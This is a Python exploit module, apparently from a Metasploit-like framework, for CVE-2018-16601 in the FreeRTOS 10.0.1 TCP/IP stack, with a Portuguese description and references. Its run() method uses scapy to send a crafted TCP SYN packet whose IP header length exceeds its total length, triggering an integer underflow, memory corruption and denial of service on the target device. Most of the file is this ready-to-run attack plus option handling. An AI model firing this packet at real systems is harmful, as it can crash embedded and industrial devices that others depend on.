from scapy.all import *

class exploit:
  _name = "CVE-2018-16601"
  _descriptions = ''' 
Este modulo explora uma vulnerabilidade encontrada na pilha TCP/IP do sistema embarcado FreeRTOS 10.0.1
e publicada em 06/12/2018. Ao fornecer um pacote TCP com o valor do campo tamanho do cabeçalho IP 
maior que tamanho total do proprio pacote, ocorre um integer underflow no calculo do tamanho do payload.
Este valor é utilizado para indicar o tamanho da região de memoria que deve ser movida na operação de remoção
do campo de opções do pacote IP, e portanto, pode causar o corrompimento de memoria e um Dos.
  '''
  _references = """
https://www.cvedetails.com/cve/CVE-2018-16601
https://blog.zimperium.com/freertos-tcpip-stack-vulnerabilities-details/  
  """
  _port = None

  def __init__(self):
    self._port = 1234

  def run(self, target):
    print("Run exploit ...")
    send(IP(dst=target, ihl=13, len=46)/TCP(dport=self._port, flags='S')/("\x00"*6))

  def show_details(self):
    print("""
Name:
............
%s

Description:
.............
%s

References:
............
%s
""" %(self._name, self._descriptions, self._references))

  def show_options(self):
    print("""
Options:
........
Name      Value             Descriptions
....      .....             ............
port      %d                The destination port to send.
""" %self._port)
  
  def set_options(self, command_str):
    if "port" in command_str:
      port = int(command_str.replace("port ", ""))
      if port >= 0 and port <= 65535:
        self._port = port
      else:
        print("%d: invalid port")
    else:
      print("%s: invalid option" %command_str)